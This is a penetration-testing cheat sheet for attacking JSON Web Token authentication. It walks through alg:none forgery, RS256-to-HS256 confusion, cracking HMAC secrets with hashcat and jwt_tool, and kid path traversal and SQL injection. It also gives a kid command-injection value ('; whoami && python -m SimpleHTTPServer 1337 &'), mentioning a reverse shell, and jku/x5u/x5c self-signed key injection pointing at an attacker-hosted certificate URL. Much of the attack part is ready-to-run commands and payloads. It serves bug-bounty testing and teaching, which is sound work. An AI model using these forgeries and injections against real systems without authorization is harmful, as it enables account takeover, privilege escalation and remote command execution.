# JWT (JSON Web Token)

A JSON Web Token (JWT) is a compact, signed format for securely exchanging data between two parties, most commonly used for authentication and session management. JWTs are signed and encoded — not encrypted — and because the mechanism is stateless (the server trusts the token contents instead of a datastore), implementations frequently get verification wrong. Successful attacks lead to authentication bypass, privilege escalation (e.g. `user` → `admin`) and full account takeover; header-parameter misuse (`kid`, `jku`, `x5u`...) can even yield SQL injection, file disclosure or command execution.

## Structure & Claims

```text
header.payload.signature
```

- **Header** — token type and signing algorithm (HMAC/SHA256 or RSA, i.e. `HS256` or `RS256`), plus optional key-location parameters (below).
- **Payload** — JSON object with the user's information (id, username, role, token generation time and custom claims).
- **Signature** — header and payload Base64url-encoded and concatenated with `.`, then passed through the crypto algorithm. If header or payload changes, the signature must be recomputed; only the Identity Provider (IdP) has the private key, which is what prevents token manipulation.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

```json
{
  "loggedInAs": "admin",
  "iat": 1422779638
}
```

```text
HMAC-SHA256(
  secret,
  base64urlEncoding(header) + '.' + base64urlEncoding(payload)
)
```

Two key mechanisms:

- **Symmetric:** a single key creates *and* verifies the JWT (most common: `HS256`) — the same key is effectively both "public" and "private", so it can be brute-forced or reused as an HMAC secret.
- **Asymmetric:** a Public key verifies and a Private key signs (most common: `RS256`).

Header parameters that tell the verifier *where* the key comes from — each is an attack surface:

- **kid (Key ID):** optional string used to identify a specific key in the filesystem or database, then that content validates the signature. Useful with multiple signing keys, but dangerous if injectable — an attacker can point at a predictable file, or inject SQL/commands.
- **ver:** version claim with the version of the JWT library used.
- **jku ("JWK Set URL"):** URL pointing to the set of keys used to validate the token. If accepted uncontrolled, an attacker hosts their own key file and declares it as the validation source.
- **jwk:** embeds the verification key directly inside the token.
- **x5u / x5c:** define the public key certificate (URI form / embedded certificate data) used for verification, like jku/jwk.
- **x5t:** base64url-encoded SHA-256 thumbprint of the X.509 certificate's DER encoding — effectively equivalent to the key identifier (`kid`).

Payload claims to know:

- **jti** — prevents replay attacks.
- **iss** — entity that issued the token.
- **iat** — issuance time.
- **nbf** — time before which the token MUST NOT be accepted.
- **exp** — expiration time on/after which the token MUST NOT be accepted.
- **aud** — recipients the token is intended for.

**Workflow:** the IdP generates a JWT certifying the user identity; the resource server decodes and verifies it with a secret salt / public key.

```text
1. User signs in using username/password or Google/Facebook.
2. Authentication server verifies credentials and issues a JWT signed with a secret salt or private key.
3. The client uses the JWT to access protected resources via the HTTP Authorization header.
4. Resource server verifies the token using the secret salt / public key.
```

![JWT workflow](https://cdn.hashnode.com/res/hashnode/image/upload/v1616225393075/v2TJSq1Hb.png?auto=compress,format&format=webp)

## Hunting Checklist

1. **Find JWT tokens** — regex-search the proxy history:
   ```text
   [= ]eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9._-]*
   [= ]eyJ[A-Za-z0-9_\/+-]*\.[A-Za-z0-9._\/+-]*
   ```
2. **Decode the full token (and each part) from Base64** (jwt.io, Burp JWT editor) and check for sensitive data in the payload (PII, roles, internal ids).
3. **Identify a reliable test page** — a request whose response clearly differs for valid vs. invalid tokens (profile pages are a good start). Send to Repeater and confirm the same token still works (not expired/one-time).
4. **Tamper claims** — `loggedInAs`/`user`/`role` → `admin`, `exp` far in the future, `iss`/`aud` swaps; try an empty payload after cracking the secret.
5. **Test `alg: none`** (incl. case variants and signature-strip formats).
6. **Test whether the signature is checked at all** (remove it / corrupt characters).
7. **Test algorithm confusion RS256 → HS256** using the app's own public key.
8. **Crack weak HS256 secrets** (jwt-heartbreaker, hashcat `16500`, jwt_tool wordlist; look for `jwt.json`-style config leaks).
9. **Inspect the header for `kid`** and test file-reference, SQLi and command-injection vectors.
10. **Inspect `jku` / `jwk` / `x5u` / `x5c` / `x5t`** and test self-signed key injection against each.
11. **Check claim-handling edge cases** — replay of `jti`, `nbf` bypass, missing/misconfigured `aud` (cross-service token relay).
12. Run the automated base methodology (`jwt_tool -M at`) and check for green lines.

## Test Cases & Examples

### 1. Check for sensitive data in the JWT

1. Intercept in Burp and log in to the web app.
2. Forward until you get the JWT token.
3. Switch to the JSON Web Token tab.
4. Check the payload section for user info or other sensitive data. Done.

### 2. None algorithm

Change `"alg"` to `none` and blank the signature. Variants worth trying: `none`, `nOne`, `None`, `n0Ne`, and the trailing-dot forms (`...` signature left empty).

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

- Modify the payload (e.g. `user` → `admin`), set `Signature = ""`, forward.
- Via JOSEPH / the Burp JWT extension the same edit is a few clicks.

```bash
python3 jwt_tool.py <JWT> -X a
```

Try each generated token; once one is accepted, re-forge it with your desired payload.

### 3. Change algorithm from RS256 to HS256

> Note: this converts the workflow from asymmetric to symmetric encryption — the token is then signed with the *same public key* the server uses to verify. Works when the app supports both algorithms.

```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
# OR
openssl s_client -connect zonksec.com:443 | openssl x509 -pubkey -noout
```

```bash
python3 jwt_tool.py <JWT> -S hs256 -k pubkey.pem
```

Use the generated token in the request, manipulate the payload, forward.

### 4. Signature not being checked

1. Capture the JWT, open the JSON Web Token tab (or JOSEPH).
2. Change the payload and either remove the signature completely or corrupt a few characters.
3. Forward — if accepted, the signature is never validated.

### 5. Crack the secret key (HS256)

```bash
hashcat -a 0 -m 16500 jwt_token.txt /usr/share/wordlist/rockyou.txt --force
hashcat --show -a 0 -m 16500 jwt_token.txt   # display the cracked secret
```

```bash
python3 jwt_tool.py <JWT> -C -d secrets.txt
```

- If **jwt-heartbreaker** is installed in Burp, weak keys are flagged automatically.
- Also look for a leaking secret key in `jwt.json` config files.
- With the secret, re-sign a forged token via jwt_tool `-p` or jwt.io.

**Tip (@MrTuxracer):** if you cracked the secret but the payload still contains unguessable parameters (like a UUID), try sending an *empty payload* — this has granted admin rights more than once.

### 6. Attacks using `kid`

**Arbitrary file verification (directory traversal):** if the header contains `kid`, point it at a file with predictable content (e.g. `/dev/null`, or any CSS/JS in the web root) and sign with its content:

```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
# Or use the content of any known web-root file:
python3 jwt_tool.py -I -hc kid -hv "path/of/the/file" -S hs256 -p "Content of the file"
```

Then manipulate the payload (`{"user":"admin"}`) and use the forged token.

**SQL injection** (in `kid` or any payload field):

```bash
python3 jwt_tool.py <JWT> -I -pc name -pv "admin' ORDER BY 1--" -S hs256 -k public.pem
```

**Command injection:**

```text
"kid": "key.crt; whoami && python -m SimpleHTTPServer 1337 &"
```

Use the forged token, then check whether port 1337 is reachable (or catch a reverse shell).

### 7. Forged header parameters

**JWK Set URL (jku)** — the app fetches the verification key from a URL you control:

```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```

This generates public key `publickey.crt` and private key `pkcs8.key`.

1. On jwt.io paste the private key and public key in the "Decoded" verify fields; host the key locally and set the `jku` header to your URL.
2. Retrieve the original key set to copy its format:
   ```bash
   wget http://example.com:8000/jwks.json
   ```
3. Extract your RSA public parameters:
   ```python
   from Crypto.PublicKey import RSA

   fp = open("publickey.crt", "r")
   key = RSA.importKey(fp.read())
   fp.close()

   print "n:", hex(key.n)
   print "e:", hex(key.e)
   ```
4. Update `n` and `e` in the local `jwks.json`, host it (repl.it or any server), manipulate the payload, copy the token from jwt.io and replace the token in the request.

**x5u claim misuse** (token signed with RS256; `x5u` points to the X.509 certificate used for verification):

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```

Paste `publicKey.pem` + `attacker.key` into jwt.io's Decoded section, then set:

```json
{
  "alg": "RS256",
  "x5u": "http://192.87.15.2:8080/attacker.crt"
}
```

(repl.it works for hosting). Use the forged JWT in the request.

**x5c claim misuse** (token carries `n`, `e`, `x5c`, `x5t`, `kid` — note `kid` = `x5t`; jwt.io auto-extracts the certificate into "Verify Signature"):

```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -in attacker.crt -text                      # extract modulus n and exponent e
# modulus (n) to base64url hex:
echo "<n value>" | sed 's/://g' | base64 | tr '\n' ' ' | sed 's/ //g' | sed 's/=//g'
# exponent (e) to base64url:
echo "<e value>" | base64 | sed 's/=//g'
# new x5c value (certificate body without BEGIN/END CERTIFICATE lines):
cat attacker.crt | tr '\n' ' ' | sed 's/ //g'
# new x5t value (kid gets the same value):
echo -n $(openssl x509 -in attacker.crt -fingerprint -noout) | sed 's/SHA1 Fingerprint=//g' | sed 's/://g' | base64 | sed 's/=//g'
```

Paste the original token into jwt.io's "Encoded" section, supply `attacker.crt` + `attacker.key` in the Decoded section, replace `x5c`/`x5t`/`kid`/`n`/`e` with the computed values, edit the payload, and send the forged token.

### 8. Quick automated methodology

```bash
python3 jwt_tool.py -M at -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

Copy the token from a request, run the attack-suite command above, and check for green lines.

## Bypass Techniques

- `alg: none` is checked case-sensitively by some libraries — try `none`, `nOne`, `None`, `n0Ne`, and empty vs. missing signature segment (`header.payload.` / `header.payload`).
- Algorithm confusion: keep the public key the server already trusts and sign with `HS256` using it as the secret (`-S hs256 -k pubkey.pem`), or embed the key via `jwk`.
- `kid`: path traversal to predictable files (`../../dev/null`, web-root JS/CSS), trailing null byte, SQLi (`' ORDER BY 1--`), and command injection (`; whoami && ...`).
- Self-signed key injection via `jku`, `x5u`, `x5c` (pair with `x5t`/`kid` recomputation) when the library trusts header-supplied keys.
- Weak/leaked HMAC secrets (`rockyou`, `jwt-cat` lists, known public keys via jwt-heartbreaker, secrets in `jwt.json`).
- Signature checks skipped entirely: drop the signature or corrupt it; validation may depend on it being *present*, not *correct*.
- Claim-level bypasses: missing `jti` → token replay; `nbf` quirks (type confusion, clock skew); missing/misconfigured `aud`/`iss` → cross-service token relay.
- Empty payload after secret-crack to dodge unguessable claims.

## Tools & Resources

**Tools**

- [jwt_tool](https://github.com/ticarpi/jwt_tool) — testing, tweaking and cracking JWTs ([Attack Methodology wiki](https://github.com/ticarpi/jwt_tool/wiki/Attack-Methodology))
- [jwt-hack](https://github.com/hahwul/jwt-hack) — en/decoding, payload generation, fast cracking
- [jwt-pwn](https://github.com/mazen160/jwt-pwn) — security testing scripts for JWT
- [c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker) — HS256 brute-forcer in C
- [jwtbrute](https://github.com/jmaxxz/jwtbrute) / [jwtcrack](https://github.com/Sjord/jwtcrack) — crack HS256 shared secrets
- [jwtcat](https://github.com/aress31/jwtcat) — weak-secret cracking
- [jwtXploiter](https://github.com/DontPanicO/jwtXploiter) — validate, forge, scan, tamper
- [Burp JSON Web Token](https://portswigger.net/bappstore/f923cbf91698420890354c1d8958fee6) / [JSON Web Token Attacker](https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) extensions, [jwt-heartbreaker](https://github.com/wallarm/jwt-heartbreaker) (known/public keys), JOSEPH
- [JWTweak](https://rishuranjanofficial.github.io/JWTweak/) — web-based testing
- [jwt.io](https://jwt.io) — analyze/token structure; any Base64 decoder; hashcat (`-m 16500`)

**Labs**

- [TokenLab: JWTLabs](https://jwt-lab.herokuapp.com/challenges) · [h-a-c/jwt-lab](https://github.com/h-a-c/jwt-lab) · [Sjord/jwtdemo](https://github.com/Sjord/jwtdemo/)
- [PentesterLab JWT Security Cheat Sheet (PDF)](https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf)

**Advanced attack series (Pentester Academy)** — key database mismanagement, verification key mismanagement I–IV, vulnerable key generator, transaction replay I–II, JWS standard for JWT I–II, bypassing `nbf` claim, special version claim, cross-service relay (missing / misconfigured `aud`), client-side token decode, `kid` command injection, blind SQLi via `kid`, `jku` claim misuse — indexed at [blog.pentesteracademy.com](https://blog.pentesteracademy.com/hacking-jwt-tokens-key-database-mismanagement-58cec7769120).

**Write-ups & reports**

- [Union CTF / Cr0wnAir writeup](https://ctftime.org/writeup/26173) · [video walkthrough](https://www.youtube.com/watch?v=bHF-uOIaM-o)
- [Exploiting JWT to Account Takeover](https://ethicalkaps.medium.com/exploiting-jwt-to-account-takeover-407b587b6cc6)
- [The Bad Twin: a peculiar JWT exploitation scenario](https://medium.com/@sandh0t/the-bad-twin-a-peculiar-case-of-jwt-exploitation-scenario-1efa03e891c0)
- [Hijacking accounts by retrieving JWT tokens via unvalidated redirects](https://www.shawarkhan.com/2019/01/hijacking-accounts-by-retrieving-jwt.html)
- HackerOne: [predictable JWT secret (Mail.ru)](https://hackerone.com/reports/896649), [insecure Zendesk SSO](https://hackerone.com/reports/638635), [Jira integration plugin](https://hackerone.com/reports/1103582)

**Blogs & videos (incl. beginner material)**

- [A plain-English intro to JWT (video, very beginner friendly)](https://www.youtube.com/watch?v=ghfmx4pr1Qg) · [How JWT works](https://sureshdsk.dev/how-json-web-token-jwt-authentication) · [Get a Feel of JWT](https://anubhav-singh.medium.com/get-a-feel-of-jwt-json-web-token-8ee9c16ce5ce)
- [Hacking JSON Web Tokens](https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a) · [Attacks on JWT](https://infosecwriteups.com/attacks-on-json-web-token-jwt-278a49a1ad2e) · [Attacking JWTs](https://infosecwriteups.com/attacking-json-web-tokens-jwts-d1d51a1e17cb) · [JWT Exploitation for Red Team](https://kurtikleiton.medium.com/json-web-token-exploitation-for-red-team-580eea1fe46a) · [JWT Hacking 101](https://trustfoundry.net/jwt-hacking-101/) · [Attacking JWT authentication](https://www.sjoerdlangkemper.nl/2016-09-28/attacking-jwt-authentication/) · [Beginner exploitation](https://barrymalone.medium.com/json-web-tokens-beginner-exploitation-5a44f8f6efff) · [JWT_Tool hacker tools](https://blog.intigriti.com/2021-07-27/hacker-tools-jwt_tool/) · [How to Exploit JWT vulnerabilities (video)](https://www.youtube.com/watch?v=IYZeVdXeUro)

**Mindmaps / tips**

![JWT mindmap](https://pbs.twimg.com/media/EhjmMwGWkAApmeq?format=jpg&name=large)
![JWT mindmap 2](https://twitter.com/busk3r/status/1408420714852487172/photo/1)
![JWT tips](https://pbs.twimg.com/media/EZkyGeGUYAEsz4e?format=jpg&name=small)

## Report Tips

- Frame impact as token forgery → impersonation/privilege escalation: "attacker can mint valid tokens for any user, including admin" = account takeover, not "missing signature check".
- For cracked secrets, state that the secret allows signing *arbitrary* tokens for *all* users (mass impact); include the cracked secret or proof token and the exact accepted request/response pair.
- For `kid` SQLi/command injection, escalate the demonstration (data extracted / out-of-band callback) — these are typically critical.

**Authors:** [KathanP19](https://twitter.com/KathanP19), [Naman Shah](https://twitter.com/naman_1910), [kAshhadali10](https://twitter.com/kAshhadali10), [0xrtt](https://twitter.com/0xrtt), [Anubhav Singh](https://twitter.com/AnubhavSingh_)
